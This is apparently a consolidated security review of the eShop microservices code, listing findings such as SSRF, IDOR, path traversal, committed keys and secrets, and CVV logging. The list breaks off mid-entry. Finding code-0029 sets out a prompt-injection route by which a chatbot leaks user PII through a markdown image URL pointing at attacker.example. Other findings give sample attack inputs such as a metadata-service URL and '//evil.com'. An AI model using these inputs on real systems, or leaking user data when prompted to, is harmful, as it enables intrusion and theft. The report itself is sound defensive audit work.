@@ -1,0 +1,628 @@
+# Security Review — Consolidated Findings Report
+
+## Code Review
+
+- **code-0001** [CRITICAL] SSRF protection is fully attacker-controlled and trivially bypassed (empty token + 2xx OPTIONS) — status: new
+  - GrantUrlTesterService.TestGrantUrl only checks that request.Url and request.GrantUrl share scheme/host/port (CheckSameOrigin) - both values are attacker-supplied so this is not a real restriction (attacker sets both to e.g. http://169.254.169.254/ or http://localhost:PORT/internal). Webhooks.API then sends a live OPTIONS HTTP request from the server to that attacker-chosen URL before any success/failure decision is made (blind SSRF primitive that fires regardless of outcome). Worse, if the attacker submits an empty/omitted Token, tokenExpected becomes null, and if the target service does not return an X-eshop-whtoken response header (the overwhelming common case for internal services / cloud metadata endpoints), tokenReceived is also null, so 'tokenReceived == tokenExpected' evaluates true; combined with any 2xx response to the OPTIONS request, grantOk becomes true and the URL is persisted as a valid webhook destination with no allowlist, scheme/IP-range restriction, or DNS-rebinding protection.
+  - Evidence/reproduction: src/Webhooks.API/Services/GrantUrlTesterService.cs:5-45
+- **code-0008** [CRITICAL] Data-mutating catalog endpoints (POST/PUT/DELETE) have no authentication or authorization — status: new
+  - None of v1.MapPut(/items, UpdateItemV1), v2.MapPut(/items/{id}, UpdateItem), api.MapPost(/items, CreateItem), or api.MapDelete(/items/{id}, DeleteItemById) call .RequireAuthorization(), and Program.cs / Extensions/Extensions.cs never call app.UseAuthentication(), app.UseAuthorization(), or builder.Services.AddDefaultAuthentication() (the helper used by sibling services Basket.API, Ordering.API, and Webhooks.API). Any unauthenticated caller with network access can create, update (including price, which fires ProductPriceChangedIntegrationEvent), or delete arbitrary catalog items.
+  - Evidence/reproduction: src/Catalog.API/Apis/CatalogApi.cs:93-107
+- **code-0009** [CRITICAL] Path traversal / arbitrary file read via client-controlled PictureFileName — status: new
+  - CreateItem and UpdateItem accept a client-supplied PictureFileName with no validation (no rejection of path separators, .. sequences, or rooted paths) and persist it verbatim. GetItemPictureById resolves it via GetFullPath(contentRootPath, pictureFileName) = Path.Combine(contentRootPath, "Pics", pictureFileName) and serves it with TypedResults.PhysicalFile. Because Path.Combine discards preceding segments when a later segment is a rooted path (e.g. /etc/passwd), and relative traversal sequences resolve normally through the filesystem, a caller can set PictureFileName to an absolute path or a ../ sequence and later GET /api/catalog/items/{id}/pic to read arbitrary files readable by the process (e.g. appsettings.Development.json). Combined with the missing authZ finding, this is exploitable by any unauthenticated caller.
+  - Evidence/reproduction: src/Catalog.API/Apis/CatalogApi.cs:217,376,420-421
+- **code-0016** [CRITICAL] Cancel-order endpoint has no ownership check (IDOR) — status: new
+  - Handle loads the order solely by command.OrderNumber via _orderRepository.GetAsync and cancels it with no check that the caller is the order's buyer. The PUT /api/orders/cancel route only requires RequireAuthorization() (any authenticated user), so any authenticated user can cancel another buyer's order by supplying its OrderNumber, since Buyer.IdentityGuid is never compared to the caller's identity.
+  - Evidence/reproduction: src/Ordering.API/Application/Commands/CancelOrderCommandHandler.cs:21
+- **code-0017** [CRITICAL] Ship-order endpoint has no ownership check (IDOR) — status: new
+  - Same pattern as the cancel handler: the order is fetched by OrderNumber only and transitioned to Shipped with no ownership verification. Any authenticated user can force another buyer's order into Shipped status by supplying its order number.
+  - Evidence/reproduction: src/Ordering.API/Application/Commands/ShipOrderCommandHandler.cs:21
+- **code-0018** [CRITICAL] GetOrderAsync leaks any buyer's order details to any authenticated user (IDOR) — status: new
+  - GetOrderAsync(id) returns full order details (address, items, total, status) for any order id with no filter on buyer identity, unlike GetOrdersFromUserAsync which correctly filters by o.Buyer.IdentityGuid == userId. GET /api/orders/{orderId} is gated only by RequireAuthorization(), so any authenticated user can enumerate order ids and read other customers' shipping address, items, and totals.
+  - Evidence/reproduction: src/Ordering.API/Application/Queries/OrderQueries.cs:6
+- **code-0021** [CRITICAL] Real RSA private signing key committed to source control and loaded at runtime — status: new
+  - tempkey.jwk contains a full RSA private key (D/P/Q/DP/DQ/QI populated) tracked in git since the initial commit and copied to the build output. Program.cs calls .AddDeveloperSigningCredential() with no environment guard, so this exact checked-in key signs every access/ID token IdentityServer issues. Anyone with repo read access can forge valid JWTs for any client/scope/subject, bypassing authentication for every downstream service that trusts this IdentityServer.
+  - Evidence/reproduction: src/Identity.API/tempkey.jwk:1
+- **code-0024** [CRITICAL] Hardcoded identical client secret 'secret' for all confidential OIDC clients — status: new
+  - Configuration/Config.cs defines the maui (line 52), webapp (line 82), and webhooksclient (line 118) clients all with ClientSecrets = { new Secret("secret".Sha256()) }. webapp/webhooksclient use RequirePkce = false, so client authentication at the token endpoint relies entirely on this shared, trivially guessable literal secret. Anyone who intercepts an authorization code can complete the code exchange and obtain tokens by impersonating the client.
+  - Evidence/reproduction: src/Identity.API/Configuration/Config.cs:52
+- **code-0034** [CRITICAL] Hardcoded default-user passwords seeded unconditionally in every environment and disclosed on login page — status: new
+  - UsersSeed.SeedAsync creates users alice/bob with userManager.CreateAsync(user, "Pass123$") (lines 33 and 78). Program.cs:12 wires this seeder with no IsDevelopment() guard, so it runs in every environment including Production. AccountController.Login is [AllowAnonymous] with no environment check, and Views/Account/Login.cshtml:37 unconditionally renders 'The default users are alice/bob, password: Pass123$', disclosing working credentials to any anonymous visitor in any deployed environment.
+  - Evidence/reproduction: src/Identity.API/UsersSeed.cs:33
+- **code-0002** [HIGH] Persistent SSRF: stored DestUrl is re-used for every future event with no re-validation or IP/host restriction — status: new
+  - WebhooksSender.OnSendData builds 'RequestUri = new Uri(subs.DestUrl, UriKind.Absolute)' directly from the DB-stored DestUrl and POSTs live order/price data to it on every OrderPaid/OrderShipped/CatalogItemPriceChange event, indefinitely. There is no allowlist, no blocking of loopback/link-local/private ranges (e.g. 127.0.0.1, 169.254.169.254 cloud metadata, 10.0.0.0/8), and no re-check at delivery time - once GrantUrlTesterService approves a URL (see linked finding on how trivial that is to satisfy), that URL becomes a durable SSRF pivot that fires on every subsequent business event.
+  - Evidence/reproduction: src/Webhooks.API/Services/WebhooksSender.cs:13-33
+- **code-0003** [HIGH] No HMAC/signature on outgoing webhook payloads; X-eshop-whtoken is a raw shared value, not a payload signature — status: new
+  - WebhooksSender.OnSendData sends the JSON body unsigned and only attaches the stored plaintext token verbatim as header 'X-eshop-whtoken' (request.Headers.Add("X-eshop-whtoken", subs.Token)). The token is not an HMAC over the payload, so it does not bind to or authenticate the body - if the body is altered/replayed by a MITM or malicious intermediary, the token header remains valid. WebhookClient's receiving endpoint mirrors this: it treats the header purely as a static bearer value ('tokenToValidate == token') rather than verifying a signature over the received bytes.
+  - Evidence/reproduction: src/Webhooks.API/Services/WebhooksSender.cs:22-25
+- **code-0004** [HIGH] Webhook receiver accepts unauthenticated forged payloads by default (ValidateToken defaults to false, no auth on endpoint) — status: new
+  - WebhookEndpoints.MapWebhookEndpoints reads 'bool.TryParse(configuration["ValidateToken"], out var validateToken)' - if the 'ValidateToken' config key is absent (it is absent from both src/WebhookClient/appsettings.json and appsettings.Development.json), TryParse fails and validateToken defaults to false. The check 'if (!validateToken || tokenToValidate == token)' then always short-circuits true, so POST /webhook-received (and OPTIONS /check) accept and persist ANY payload from ANY caller with no authentication middleware on the endpoint (app.MapWebhookEndpoints() is not behind RequireAuthorization in Program.cs) and no default-on signature/token check. Any network-reachable client can forge an 'order paid' notification.
+  - Evidence/reproduction: src/WebhookClient/Endpoints/WebhookEndpoints.cs:10-53
+- **code-0010** [HIGH] PaginationRequest.PageSize/PageIndex have no bounds validation — status: new
+  - PageSize and PageIndex are bound directly from query parameters with no minimum/maximum and are used as Skip(pageSize * pageIndex).Take(pageSize) in GetAllItems and GetItemsBySemanticRelevance. A client can pass a very large PageSize to force materialization of huge result sets (DoS), or pick PageSize/PageIndex values whose product overflows int32 and goes negative, producing a negative OFFSET that Npgsql/Postgres rejects, causing an unhandled exception on that request.
+  - Evidence/reproduction: src/Catalog.API/Model/PaginationRequest.cs:5-13
+- **code-0019** [HIGH] CreateOrder trusts client-supplied UserId instead of authenticated identity — status: new
+  - CreateOrderAsync builds the CreateOrderCommand from request.UserId taken directly from the client-supplied request body, instead of the identity from IIdentityService (used correctly elsewhere). An authenticated attacker can POST a different UserId than their own token's identity, creating orders attributed to another buyer.
+  - Evidence/reproduction: src/Ordering.API/Apis/OrdersApi.cs:141
+- **code-0020** [HIGH] CVV/card security number logged in plaintext via structured logging — status: new
+  - LoggingBehavior.Handle logs every MediatR request via {@Command} destructuring, capturing the full CreateOrderCommand including the unmasked CardSecurityNumber (CVV), CardHolderName, and CardExpiration, despite OrdersApi.cs manually masking only the card number before constructing the command.
+  - Evidence/reproduction: src/Ordering.API/Application/Behaviors/LoggingBehavior.cs:9
+- **code-0025** [HIGH] Authentication/authorization middleware never added to HTTP pipeline — status: new
+  - Program.cs registers cookie+OIDC authentication and authorization services via AddAuthenticationServices()/AddApplicationServices() (Extensions.cs), but Program.cs never calls app.UseAuthentication() or app.UseAuthorization(). Confirmed by reading Program.cs (only UseAntiforgery, UseHttpsRedirection, UseStaticFiles, MapRazorComponents, MapForwarder are present) and eShop.ServiceDefaults/Extensions.cs MapDefaultEndpoints (only maps /health and /alive, no auth middleware). Without UseAuthentication(), HttpContext.User is not populated from the auth cookie on incoming requests, so the ServerAuthenticationStateProvider used by Blazor's CascadingAuthenticationState never sees a valid authenticated identity on subsequent requests after sign-in, undermining [Authorize] enforcement across the app.
+  - Evidence/reproduction: src/WebApp/Program.cs:12-34
+- **code-0028** [HIGH] Open redirect via protocol-relative returnUrl bypassing IsAbsoluteUri check — status: new
+  - OnInitializedAsync builds 'var url = new Uri(returnUrl, UriKind.RelativeOrAbsolute); Nav.NavigateTo(url.IsAbsoluteUri ? "/" : returnUrl);'. A scheme-less, protocol-relative value such as returnUrl=//evil.com (or backslash variant /\evil.com which browsers normalize to //evil.com) is treated as NOT absolute by System.Uri (IsAbsoluteUri == false) because it lacks a scheme, so the raw attacker-controlled value is passed straight to NavigateTo and the browser redirects the just-authenticated user to evil.com. LogIn.Url(nav) confirms returnUrl is an attacker-controllable query parameter reachable pre-auth.
+  - Evidence/reproduction: src/WebApp/Components/Pages/User/LogIn.razor:11-17
+- **code-0029** [HIGH] Chatbot markdown image auto-load enables PII exfiltration (no URL allow-list, no sanitization) — status: new
+  - MessageProcessor.AllowImages (MessageProcessor.cs:10-34) converts any '[text](url)' or '![text](url)' pattern found in a chat message into a live '<img src="url">' tag (regex \!?\[([^\]]+)\]\s*\(([^\)]+)\) makes the leading '!' optional, so plain markdown links are also turned into images). The captured groups are HTML-attribute-encoded (preventing attribute breakout / classic script-tag XSS) but the URL itself is never validated against a scheme/host allow-list. This is rendered via @MessageProcessor.AllowImages(message.Text) inside a MarkupString for both assistant and user messages (Chatbot.razor:24), and img tags auto-fetch as soon as they render (no click needed). Separately, ChatState.cs registers a GetUserInfo tool (ChatState.cs:96-115) that returns the user's full name, address, email and phone number as an AI-callable function result, which becomes part of the LLM conversation context. A prompt-injected or manipulated LLM response containing a markdown image whose URL query string embeds this PII (e.g. ![x](https://attacker.example/log?d=<email>)) would be auto-rendered and silently exfiltrate that data to an attacker-controlled host the instant the message displays, with no server-side or client-side sanitization step in between.
+  - Evidence/reproduction: src/WebApp/Components/Chatbot/MessageProcessor.cs:10-34
+- **code-0036** [HIGH] Full payment card data (including CVV) stored and issued as identity/token claims — status: new
+  - ProfileService.GetClaimsFromUser (lines 70-77) adds user.CardNumber, CardHolderName, SecurityNumber (CVV), and Expiration as claims (card_number, card_holder, card_security_number, card_expiration) that flow into ID tokens/profile-scope responses for any client. ApplicationUser persists these fields directly in the Identity user table. Retaining CVV at rest and propagating PAN/CVV/expiration into OIDC claims is a PCI-DSS violation and exposes this data to every relying-party client and to any logging/tracing middleware that captures claims.
+  - Evidence/reproduction: src/Identity.API/Services/ProfileService.cs:70
+- **code-0005** [MEDIUM] Unhandled exception in Task.WhenAll aborts entire webhook fan-out batch on a single failing/slow receiver — status: new
+  - WebhooksSender.SendAll awaits 'Task.WhenAll(tasks)' where each task is 'client.SendAsync(request)' with no try/catch and no explicit per-request timeout in OnSendData. If any one subscriber's endpoint is unreachable, slow, or errors, the resulting exception propagates out of SendAll into the IntegrationEventHandler.Handle call, which surfaces to the event bus consumer - this can cause the whole integration event (affecting all other, otherwise-successful, receivers) to be treated as failed/retried by the bus, and a single malicious or broken subscriber URL can hold up processing for up to the default HttpClient timeout (100s) with no isolation between receivers.
+  - Evidence/reproduction: src/Webhooks.API/Services/WebhooksSender.cs:5-33
+- **code-0011** [MEDIUM] Unbounded ids[] array in GetItemsByIds enables oversized query / DoS — status: new
+  - GetItemsByIds takes int[] ids directly from the query string with no length cap and executes Where(item => ids.Contains(item.Id)). A client can supply a very large number of ids in a single unauthenticated GET request, producing an oversized generated SQL IN-list/parameter array and consuming excess CPU/memory/DB time.
+  - Evidence/reproduction: src/Catalog.API/Apis/CatalogApi.cs:162-168
+- **code-0012** [MEDIUM] CreateItem trusts client-supplied primary key (Id) for new catalog items — status: new
+  - CreateItem copies product.Id from the client request body directly into the new CatalogItem's Id with no server-side validation or override. Combined with the missing-authorization finding, any caller can create catalog rows with attacker-chosen IDs, enabling ID-squatting/collisions with future legitimate inserts or confusing other services (Ordering/Basket) that reference catalog item IDs.
+  - Evidence/reproduction: src/Catalog.API/Apis/CatalogApi.cs:366-381
+- **code-0013** [MEDIUM] UpdateItem never reconciles route id with body productToUpdate.Id before SetValues — status: new
+  - UpdateItem loads the tracked entity by route id, then calls catalogEntry.CurrentValues.SetValues(productToUpdate) without checking productToUpdate.Id == id. If the client submits a body Id different from the route id (e.g. PUT /api/catalog/items/5 with body {id:6}), EF Core's primary-key handling on the tracked entity can throw an InvalidOperationException, surfacing as an unhandled 500 instead of a clean 400 validation error.
+  - Evidence/reproduction: src/Catalog.API/Apis/CatalogApi.cs:324-341
+- **code-0022** [MEDIUM] Unvalidated CardNumber substring throws before validator runs — status: new
+  - request.CardNumber.Substring(request.CardNumber.Length - 4) executes before any FluentValidation validator runs. A null or short (<4 char) CardNumber throws an unhandled NullReferenceException/ArgumentOutOfRangeException, producing an unhandled 500 instead of the intended BadRequest.
+  - Evidence/reproduction: src/Ordering.API/Apis/OrdersApi.cs:140
+- **code-0023** [MEDIUM] Order totals trust client-supplied unit prices with no server-side recompute — status: new
+  - UnitPrice on BasketItem/OrderItemDTO is fully client-supplied and flows unchanged into Order.AddOrderItem with no recomputation against catalog pricing. A client can submit an arbitrarily low UnitPrice; only unitPrice*units >= discount is checked, so resulting order totals reflect attacker-controlled prices.
+  - Evidence/reproduction: src/Ordering.API/Application/Models/BasketItem.cs:8
+- **code-0026** [MEDIUM] Hardcoded OIDC client secret in source code — status: new
+  - options.ClientSecret = "secret"; is a literal hardcoded string in AddAuthenticationServices(), unlike IdentityUrl/CallBackUrl which are sourced from configuration via GetRequiredValue. Hardcoding a client secret in source means it cannot be rotated without a code change/redeploy and is exposed to anyone with source access.
+  - Evidence/reproduction: src/WebApp/Extensions/Extensions.cs:78
+- **code-0027** [MEDIUM] RequireHttpsMetadata disabled unconditionally for OIDC — status: new
+  - options.RequireHttpsMetadata = false; is set with no IsDevelopment() guard, so HTTPS is not required for the identity provider's discovery/metadata and token endpoints in any environment, weakening protection against MITM tampering of OIDC configuration/tokens in production.
+  - Evidence/reproduction: src/WebApp/Extensions/Extensions.cs:82
+- **code-0030** [MEDIUM] Order status transitions lack optimistic concurrency control — status: new
+  - SetShippedStatus, SetCancelledStatus, SetPaidStatus, etc. are check-then-act on the in-memory OrderStatus with no concurrency token configured anywhere in Ordering.Infrastructure or Ordering.Domain. Two concurrent requests transitioning order status can both pass their status guard and the later SaveChangesAsync silently overwrites the other's state instead of failing with a concurrency conflict.
+  - Evidence/reproduction: src/Ordering.Domain/AggregatesModel/OrderAggregate/Order.cs:130
+- **code-0031** [MEDIUM] Broad catch-and-swallow in IdentifiedCommandHandler hides all command failures — status: new
+  - The bare catch { return default; } around _mediator.Send(command, ...) swallows every exception, including legitimate domain exceptions or transient DB failures, with no logging, making real failures indistinguishable from a successful no-op.
+  - Evidence/reproduction: src/Ordering.API/Application/Commands/IdentifiedCommandHandler.cs:99
+- **code-0037** [MEDIUM] Developer signing-key credential has no production guard — status: new
+  - Program.cs:28-29 sets options.KeyManagement.Enabled = false and line 36-37 calls .AddDeveloperSigningCredential(), both marked with '// TODO: Remove/Not recommended for production' comments, but no code branch selects a real key provider for non-development environments. This TODO-without-enforcement pattern is the root cause enabling the checked-in tempkey.jwk to be used as the production signing key.
+  - Evidence/reproduction: src/Identity.API/Program.cs:36
+- **code-0039** [MEDIUM] OrderStatus integration event handlers have no null-guard or exception handling around buyer id lookup — status: new
+  - All six handlers (OrderStatusChangedTo AwaitingValidation/Cancelled/Paid/Shipped/StockConfirmed/Submitted IntegrationEventHandler) share the identical body: log then 'await orderStatusNotificationService.NotifyOrderStatusChangedAsync(event.BuyerIdentityGuid);' with no null/empty check on the event or BuyerIdentityGuid and no try/catch. NotifyOrderStatusChangedAsync (OrderStatusNotificationService.cs line 31) calls a Dictionary TryGetValue(buyerId, ...) which throws ArgumentNullException if buyerId is null. Since BuyerIdentityGuid is a plain string on the event record with no validation, a malformed/missing value in the upstream event payload propagates an unhandled exception straight out of Handle with nothing in these files to catch it -- a resiliency gap in this background event-processing path.
+  - Evidence/reproduction: src/WebApp/Services/OrderStatus/IntegrationEvents/EventHandling/OrderStatusChangedToAwaitingValidationIntegrationEventHandler.cs:10-14 (and 5 sibling handlers in same directory)
+- **code-0040** [MEDIUM] Deprecated Implicit grant type used for Swagger UI clients — status: new
+  - basketswaggerui (line 148), orderingswaggerui (line 163), and webhooksswaggerui (line 178) in Configuration/Config.cs use AllowedGrantTypes = GrantTypes.Implicit with AllowAccessTokensViaBrowser = true and no client secret. The Implicit flow returns access tokens in the URL fragment, which can leak via browser history, Referer headers, or logs, and is deprecated in favor of Authorization Code + PKCE. If these Swagger endpoints are reachable outside a trusted network, this is a token-leakage risk.
+  - Evidence/reproduction: src/Identity.API/Configuration/Config.cs:148
+- **code-0041** [MEDIUM] Basket deleted after checkout without verifying order creation succeeded — status: new
+  - BasketState.CheckoutAsync does 'await orderingService.CreateOrder(request, checkoutInfo.RequestId); await DeleteBasketAsync();'. OrderingService.CreateOrder returns the raw httpClient.SendAsync(requestMessage) result and never calls EnsureSuccessStatusCode() or checks IsSuccessStatusCode. If Ordering.API rejects the request (validation failure, 5xx, etc.), await on SendAsync completes normally (HttpClient does not throw for non-2xx by default), so CheckoutAsync proceeds to delete the basket and the UI navigates to the orders page as if checkout succeeded -- the basket contents are silently lost with no order actually placed.
+  - Evidence/reproduction: src/WebApp/Services/BasketState.cs:107-108
+- **code-0047** [MEDIUM] Unvalidated Page query parameter can produce negative or huge pageIndex sent to backend — status: new
+  - Catalog.razor exposes '[SupplyParameterFromQuery] public int? Page' straight from the URL query string with no bounds check before computing 'Page.GetValueOrDefault(1) - 1' and forwarding it into CatalogService.GetCatalogItems, which passes it unchecked into the backend request URL as pageIndex={pageIndex} (CatalogService.cs GetAllCatalogItemsUri). A crafted value such as ?Page=0, ?Page=-500000, or ?Page=2000000000 produces a negative or huge pageIndex sent to the backend catalog API with no client-side or shared-library validation.
+  - Evidence/reproduction: src/WebApp/Components/Pages/Catalog/Catalog.razor:40-41,56-60
+- **code-0048** [MEDIUM] Null-forgiving operator on deserialized HTTP results without null-guard across CatalogService — status: new
+  - GetCatalogItems(pageIndex,...), GetCatalogItems(ids), GetCatalogItemsWithSemanticRelevance, GetBrands, and GetTypes in CatalogService.cs all do 'var result = await httpClient.GetFromJsonAsync<T>(uri); return result!;'. GetFromJsonAsync<T> returns null if the response body is empty or the literal JSON null. Every one of these methods suppresses the nullable warning with '!' instead of guarding, so a NullReferenceException can propagate later (e.g. catalogResult.Data in Catalog.razor) if the backend ever returns an empty/null body with a 200 status.
+  - Evidence/reproduction: src/WebAppComponents/Services/CatalogService.cs:20-21,27-28,34-35,41-42,48-49
+- **code-0050** [MEDIUM] HttpContext! null-forgiving in 404 handler inconsistent with earlier null-safe access — status: new
+  - ItemPage.razor null-checks HttpContext with '?.' at line 79 (isLoggedIn = HttpContext?.User.Identity?.IsAuthenticated == true;), acknowledging it can be null, but then in the catch block for HttpRequestException NotFound does 'HttpContext!.Response.StatusCode = 404;'. If HttpContext is actually null when a 404 occurs (e.g. under certain interactive render-mode circumstances where the cascading HttpContext parameter is not supplied), this throws a NullReferenceException instead of rendering the intended not-found UI.
+  - Evidence/reproduction: src/WebApp/Components/Pages/Item/ItemPage.razor:79,83-86
+- **code-0051** [MEDIUM] No CancellationToken used or forwarded in any CatalogService HTTP call — status: new
+  - None of GetCatalogItem, GetCatalogItems(pageIndex,...), GetCatalogItems(ids), GetCatalogItemsWithSemanticRelevance, GetBrands, or GetTypes in CatalogService.cs accept or pass a CancellationToken to GetFromJsonAsync, and callers (Catalog.razor, ItemPage.razor, CatalogSearch.razor) do not wire one up either. Rapid pagination/filter changes (each re-render triggers a new query) can fire overlapping requests with no way to cancel the stale one, and a disposed component's in-flight request can still attempt to set state after teardown.
+  - Evidence/reproduction: src/WebAppComponents/Services/CatalogService.cs:11-50
+- **code-0052** [MEDIUM] Basket quantity/validation logic is dead code, allowing invalid quantities into Redis — status: new
+  - BasketItem.Validate() (src/Basket.API/Model/BasketItem.cs:13-23) rejects Quantity < 1, but nothing in the gRPC pipeline calls it: BasketService.MapToCustomerBasket (src/Basket.API/Grpc/BasketService.cs:93-110) copies ProductId/Quantity straight from the client-supplied UpdateBasketRequest into a CustomerBasket, and RedisBasketRepository.UpdateBasketAsync (src/Basket.API/Repositories/RedisBasketRepository.cs:34-48) persists it to Redis verbatim. gRPC endpoints do not run ASP.NET Core MVC model validation, so an authenticated caller can send quantity = -1, 0, or int.MaxValue (or any int32 product_id, per Proto/basket.proto) and it is stored as-is with no server-side rejection. Any downstream consumer that treats basket quantities as positive integers (e.g. order-total/inventory calculations) inherits this unvalidated data.
+  - Evidence/reproduction: src/Basket.API/Grpc/BasketService.cs:93
+- **code-0054** [MEDIUM] PaymentProcessor has no idempotency/dedup protection for duplicate event redelivery — status: new
+  - OrderStatusChangedToStockConfirmedIntegrationEventHandler.Handle (src/PaymentProcessor/IntegrationEvents/EventHandling/OrderStatusChangedToStockConfirmedIntegrationEventHandler.cs:9-33) is a pure function of @event.OrderId and a static PaymentOptions.PaymentSucceeded flag; it keeps no record of which OrderId/event Id has already been processed, and PaymentProcessor.csproj has no database/persistence dependency at all, so no dedup store is even possible. RabbitMQEventBus.OnMessageReceived (src/EventBusRabbitMQ/RabbitMQEventBus.cs, OnMessageReceived/ProcessEvent) only calls BasicAckAsync after ProcessEvent finishes (exceptions inside the handler are caught and the message is still acked, per the code comment 'Even on exception we take the message off the queue'). However, if the process crashes or the connection drops while awaiting ProcessEvent/handler.Handle (i.e. before that ack is sent), the durable, persistent-mode message is redelivered on reconnect, causing the handler to run again for the same OrderId and publish a second OrderPaymentSucceededIntegrationEvent/OrderPaymentFailedIntegrationEvent. PaymentProcessor itself only simulates a payment gateway here, so no duplicate real-money charge occurs in this component, but any downstream consumer that is not itself idempotent (e.g. Ordering.API reacting to payment-succeeded) would double-process a single logical payment.
+  - Evidence/reproduction: src/PaymentProcessor/IntegrationEvents/EventHandling/OrderStatusChangedToStockConfirmedIntegrationEventHandler.cs:9
+- **code-0055** [MEDIUM] JWT audience validation is disabled despite an audience being configured for Basket.API — status: new
+  - Basket.API wires up authentication via AddDefaultAuthentication() (src/Basket.API/Extensions/Extensions.cs:12), which is implemented in the shared src/eShop.ServiceDefaults/AuthenticationExtensions.cs. That method reads Identity:Audience from config (Basket.API/appsettings.json sets it to "basket") and assigns it to options.Audience (line 40), but then explicitly sets options.TokenValidationParameters.ValidateAudience = false (line 49). This means the configured audience is never actually enforced: any JWT issued by the trusted identity provider for a *different* audience (e.g. a token scoped for another resource/service) would still pass validation against Basket.API as long as the issuer matches, weakening the intended per-service authorization boundary. This is a shared helper directly invoked by Basket.API's own startup code, so it materially affects Basket.API's authentication posture even though the helper class itself lives outside the Basket.API directory.
+  - Evidence/reproduction: src/eShop.ServiceDefaults/AuthenticationExtensions.cs:49
+- **code-0006** [LOW] Hardcoded OIDC client secret and RequireHttpsMetadata=false in WebhookClient auth wiring — status: new
+  - AddAuthenticationServices sets 'options.ClientSecret = "secret";' as a hardcoded plaintext OIDC client secret, and unconditionally sets 'options.RequireHttpsMetadata = false;' (not gated to Development only), disabling TLS certificate validation for OIDC discovery/token retrieval against the configured Identity authority in all environments.
+  - Evidence/reproduction: src/WebhookClient/Extensions/Extensions.cs:54,58
+- **code-0007** [LOW] Database credential with weak placeholder password committed in appsettings.Development.json — status: new
+  - src/Webhooks.API/appsettings.Development.json contains 'ConnectionStrings:WebHooksDB' = "Host=localhost;Database=WebHooksDB;Username=postgres;Password=yourWeak(!)Password" - a real-looking connection string with credentials checked into source control (dev-only, but still a plaintext secret in the repo).
+  - Evidence/reproduction: src/Webhooks.API/appsettings.Development.json:10
+- **code-0014** [LOW] DeleteItemById uses synchronous SingleOrDefault inside an async endpoint — status: new
+  - services.Context.CatalogItems.SingleOrDefault(x => x.Id == id) blocks the calling thread-pool thread on the DB round trip instead of using SingleOrDefaultAsync, unlike every other query in the file. Under load this ties up thread-pool threads unnecessarily and can contribute to thread-pool starvation.
+  - Evidence/reproduction: src/Catalog.API/Apis/CatalogApi.cs:394
+- **code-0015** [LOW] Hardcoded database credential in appsettings.Development.json — status: new
+  - The connection string CatalogDB=Host=localhost;Database=CatalogDB;Username=postgres;Password=yourWeak(!)Password is committed to source control in plaintext. It is a local-dev-only credential, but it is still a plaintext secret in the repo, and it is exactly the kind of file that becomes readable by an unauthenticated remote attacker through the path-traversal bug in GetItemPictureById.
+  - Evidence/reproduction: src/Catalog.API/appsettings.Development.json:3
+- **code-0032** [LOW] Missing null check on order lookup in payment-verified domain event handler — status: new
+  - orderToUpdate from _orderRepository.GetAsync(domainEvent.OrderId) is used directly with no null check, unlike other handlers (Cancel/Ship/SetPaid all check for null). If the order can't be found, this throws an unhandled NullReferenceException inside domain-event dispatch.
+  - Evidence/reproduction: src/Ordering.API/Application/DomainEventHandlers/UpdateOrderWhenBuyerAndPaymentMethodVerifiedDomainEventHandler.cs:21
+- **code-0033** [LOW] Hardcoded dev DB password committed in appsettings.Development.json — status: new
+  - The connection string contains a hardcoded plaintext password. Low risk since it targets localhost and is clearly a dev placeholder, but it is still a committed plaintext credential.
+  - Evidence/reproduction: src/Ordering.API/appsettings.Development.json:3
+- **code-0035** [LOW] JS module reference leaked, never disposed — status: new
+  - jsModule is assigned from JS.InvokeAsync<IJSObjectReference>(import, Chatbot.razor.js), which implements IAsyncDisposable, but Chatbot.razor does not implement IDisposable/IAsyncDisposable to dispose jsModule, leaking the JS module reference for the lifetime of each component instance/circuit.
+  - Evidence/reproduction: src/WebApp/Components/Chatbot/Chatbot.razor:83
+- **code-0038** [LOW] Null-forgiving operator on possibly-null catalog item in AddToCart tool — status: new
+  - ChatState.AddToCart does 'var item = await _catalogService.GetCatalogItem(itemId); await _basketState.AddAsync(item!);'. GetCatalogItem can return null for an unknown itemId (the id is supplied by the LLM tool-call argument), and item! suppresses the nullable warning instead of checking. A resulting NullReferenceException would be caught by the surrounding catch(Exception e) and turned into a generic error string, so it is not a crash, but the missing explicit null check means the user gets a generic error instead of a clear item-not-found response.
+  - Evidence/reproduction: src/WebApp/Components/Chatbot/ChatState.cs:141-142
+- **code-0042** [LOW] Dev database credentials committed to source control — status: new
+  - appsettings.Development.json:3 contains a plaintext connection string 'Host=localhost;Database=IdentityDB;Username=postgres;Password=yourWeak(!)Password' checked into git. Scoped to Development, and mirrors a repo-wide convention across other eShop services, but should still be treated as compromised if the repo is public.
+  - Evidence/reproduction: src/Identity.API/appsettings.Development.json:3
+- **code-0043** [LOW] Unhandled KeyNotFoundException if a basket references a product removed from the catalog — status: new
+  - FetchCoreAsync builds catalogItems as a Dictionary from GetCatalogItems(productIds), then does 'var catalogItem = catalogItems[item.ProductId];' using the dictionary indexer rather than TryGetValue. If a product referenced in the persisted basket has been removed/deactivated in the catalog service (or the catalog service omits it from the response), this throws KeyNotFoundException, breaking the cart/checkout page for that user with no graceful handling.
+  - Evidence/reproduction: src/WebApp/Services/BasketState.cs:132-135
+- **code-0044** [LOW] Null-forgiving operator on form-supplied nullable ints without validation — status: new
+  - CartPage.razor does 'var id = UpdateQuantityId!.Value; var quantity = UpdateQuantityValue!.Value;' where UpdateQuantityId/UpdateQuantityValue are [SupplyParameterFromForm] nullable ints bound to client-controlled form fields. If a crafted POST to this enhanced-navigation form omits those fields, they are null and .Value throws InvalidOperationException, causing a request failure for that submission instead of a graceful validation error.
+  - Evidence/reproduction: src/WebApp/Components/Pages/Cart/CartPage.razor:111-112
+- **code-0045** [LOW] Discarded (fire-and-forget) Task in exception handler — status: new
+  - In the catch block, '_ = DispatchExceptionAsync(ex);' discards the returned Task rather than awaiting or observing it. If that task itself faults, the exception is unobserved and only surfaces (if at all) as an UnobservedTaskException during GC, not as an actionable error.
+  - Evidence/reproduction: src/WebApp/Components/Pages/User/OrdersRefreshOnStatusChange.razor:33
+- **code-0046** [LOW] Dangling scope references not registered as ApiScope/ApiResource — status: new
+  - The maui client lists 'mobileshoppingagg' (Config.cs:66) and the webapp client lists 'webshoppingagg' (Config.cs:106) in AllowedScopes, but neither is registered in Config.GetApiScopes()/GetApis(), nor referenced elsewhere in src/. IdentityServer silently drops unregistered scopes from issued tokens, likely breaking intended BFF/aggregator authorization for these clients.
+  - Evidence/reproduction: src/Identity.API/Configuration/Config.cs:66
+- **code-0049** [LOW] Unused RedirectService has no host/allow-list validation — status: new
